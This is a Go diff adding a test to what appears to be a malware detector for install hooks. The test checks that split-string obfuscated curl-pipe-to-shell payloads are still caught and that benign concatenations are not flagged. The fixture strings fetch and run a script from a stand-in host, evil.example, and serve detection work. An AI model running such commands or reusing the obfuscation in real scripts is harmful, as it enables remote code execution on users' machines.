@@ -271,3 +271,27 @@ func TestDetectSuspiciousInstallHook(t *testing.T) {
 		})
 	}
 }
+
+// Split-string obfuscation must not hide a curl|sh / eval payload: the
+// matcher collapses adjacent string-literal concatenations before scanning.
+func TestScriptMatchesMalwarePattern_DefeatsConcatObfuscation(t *testing.T) {
+	bad := []string{
+		`"cur" + "l -fsSL http://evil.example/x.sh | sh"`,
+		`"cu"+"rl htt"+"p://evil.example | ba"+"sh"`,
+		`'curl http://evil.example | ' + 'sh'`,
+	}
+	for _, s := range bad {
+		if !scriptMatchesMalwarePattern(s) {
+			t.Errorf("expected malware match for split-string payload: %s", s)
+		}
+	}
+	good := []string{
+		`console.log("hello " + "world")`,
+		`"build" + "/output"`,
+	}
+	for _, s := range good {
+		if scriptMatchesMalwarePattern(s) {
+			t.Errorf("false positive on benign concat: %s", s)
+		}
+	}
+}
